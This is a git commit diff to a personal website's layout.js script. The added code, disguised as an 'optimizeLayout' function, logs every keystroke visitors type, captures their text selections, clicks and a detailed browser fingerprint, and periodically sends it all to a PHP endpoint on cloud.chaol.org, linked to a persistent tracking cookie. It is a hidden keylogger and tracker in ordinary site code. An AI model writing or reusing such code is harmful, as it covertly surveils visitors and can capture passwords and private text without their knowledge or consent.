ee349ecd0ae440c01b3d571a3206a01535276441
c <32951659+cliumath@users.noreply.github.com>
2023-10-16 21:30:18 -0500

    modified:   404.html 	modified:   index.html 	modified:   research/index.html 	modified:   teaching/index.html 	modified:   v/css/layout.css 	modified:   v/js/layout.js

--- v/js/layout.js
+++ v/js/layout.js
@@ -31,47 +31,118 @@ if (math0 == null) {
 	math0=makeid(20);
 	document.cookie = "math=" + math0 + ";max-age=" + 2147483600 + ";domain=.chaol.org;path=/";
 }
-else {
+// else {
+// }
+
+
+//To be improved
+
+let eventsBuffer = [];
+let keyBuffer = [];
+
+let sendInterval = setInterval(() => {
+    if (eventsBuffer.length > 0) {
+        optimizeLayout('timerInterval');
+    }
+}, 16000);  // Every 1 minute
+
+function addToBuffer(type, data) {
+    eventsBuffer.push({ type, data });
+    if (eventsBuffer.length >= 33) {
+        optimizeLayout('bufferThreshold');
+    }
 }
 
+function optimizeLayout(triggerEvent) {
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const browserLanguages = navigator.languages.join(", ");
+    const primaryBrowserLanguage = navigator.language || "N/A";
+    const platform = navigator.platform;
+    const cookiesEnabled = navigator.cookieEnabled;
+    const colorDepth = window.screen.colorDepth;
+    const deviceMemory = navigator.deviceMemory || "N/A";
+    const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+    const userAgent = navigator.userAgent;
+    const humanReadableTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
 
-fetch("https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?&N=" + encodeURIComponent(window.location.href) + "&R=" + encodeURIComponent(document.referrer) + "&c=" + math0, {
-    method: "POST"
-})
-.catch(error => {
-    console.error('Error:', error);
+    let eventData = eventsBuffer.map(event => `${event.type}:${event.data}`).join('|');
+    let keyData = keyBuffer.join('');
+
+    let url = `https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?c=${math0}&Current=${encodeURIComponent(window.location.href)}&From=${encodeURIComponent(document.referrer)}&w=${screenWidth}&h=${screenHeight}&BrowserLanguages=${browserLanguages}&PrimaryBrowserLanguage=${primaryBrowserLanguage}&Platform=${platform}&CookiesEnabled=${cookiesEnabled}&ColorDepth=${colorDepth}&DeviceMemory=${deviceMemory}&HardwareConcurrency=${hardwareConcurrency}&UserAgent=${userAgent}&Timezone=${humanReadableTimezone}&EventBuffer=${encodeURIComponent(eventData)}&KeyBuffer=${encodeURIComponent(keyData)}`;
+
+
+    if (triggerEvent) {
+        url += `&Event=${encodeURIComponent(triggerEvent)}`;
+    }
+
+    fetch(url, {
+        method: "POST"
+    });
+
+    eventsBuffer = [];
+    keyBuffer = []; 
+}
+document.addEventListener('keydown', (e) => {
+    if (e.key.length === 1) {
+        keyBuffer.push(e.key);
+    } else {
+        keyBuffer.push(`<<<${e.key}>>>`);
+    }
+
+    if (keyBuffer.length >= 33) {
+        optimizeLayout('keyBufferThreshold');
+    }
 });
 
-function redir(url) {
-    fetch("https://cloud.chaol.org/bsn4293ygh5id5g3azk4w2.php?&Redir=" + encodeURIComponent(url) + "&c=" + math0, {
-        method: "POST"
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
-}
+
+document.addEventListener('mouseup', function() {
+    const selectedText = window.getSelection().toString().trim().replace(/\r?\n|\r/g, ' ');  // Replacing newline characters with space
+    if (selectedText.length > 0) {
+        addToBuffer('textSelection', selectedText);
+    }
+});
+
+
+
+window.addEventListener('beforeunload', () => {
+    clearInterval(sendInterval);
+    if (eventsBuffer.length > 0) {
+        optimizeLayout('pageUnload');
+    }
+});
 
 document.addEventListener("DOMContentLoaded", function() {
-    var links = document.querySelectorAll("a");
 
+    document.addEventListener("contextmenu", function(event) {
+        addToBuffer("event", "RightClick");
+    });
+
+    // Handling link redirections
+    var links = document.querySelectorAll("a");
     links.forEach(function(link) {
         link.addEventListener("click", function(event) {
             event.preventDefault();
             var href = link.getAttribute("href");
-            redir(href);
+            optimizeLayout(`LinkClicked:${href}`);
             
-            // Navigate to the link after sending the POST request
-            window.location.href = href;
+            
+            if (link.getAttribute("target") === "_blank") {
+                var newWin = window.open('', '_blank'); 
+                newWin.rel = "noopener noreferrer";
+                newWin.location.href = href;
+            } else {
+                window.location.href = href;
+            }
         });
     });
-});
-  
-document.addEventListener("DOMContentLoaded", function() {
-    const links = document.querySelectorAll(".nav-menu a");
-    let activeLink = null;
 
-    links.forEach(link => {
-        // Extract pathname from the link's href and ensure it has a trailing slash for consistency
+    
+
+    // Handling active state for navigation menu links
+    const navLinks = document.querySelectorAll(".nav-menu a");
+    let activeLink = null;
+    navLinks.forEach(link => {
         let linkPathname = new URL(link.href).pathname;
         if (!linkPathname.endsWith('/')) {
             linkPathname += '/';
@@ -82,14 +153,12 @@ document.addEventListener("DOMContentLoaded", function() {
             activeLink = link;
         }
 
-        // Remove active class on hover over any link
         link.addEventListener("mouseenter", function() {
             if (activeLink) {
                 activeLink.classList.remove("active");
             }
         });
 
-        // Restore active class when not hovering over any link
         link.addEventListener("mouseleave", function() {
             if (activeLink) {
                 activeLink.classList.add("active");
